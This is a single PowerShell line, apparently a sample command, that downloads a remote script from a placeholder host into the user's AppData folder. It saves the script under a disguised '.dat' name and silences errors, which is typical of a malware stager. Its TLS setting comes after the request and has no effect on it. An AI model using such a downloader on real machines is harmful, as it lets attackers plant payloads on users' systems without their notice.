
$PayloadUrl = "https://adatum.com:443/updater.ps1"; $OutputPath = "$env:APPDATA\update.dat"; Invoke-WebRequest -Uri $PayloadUrl -OutFile $OutputPath -UseBasicParsing -ErrorAction SilentlyContinue; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
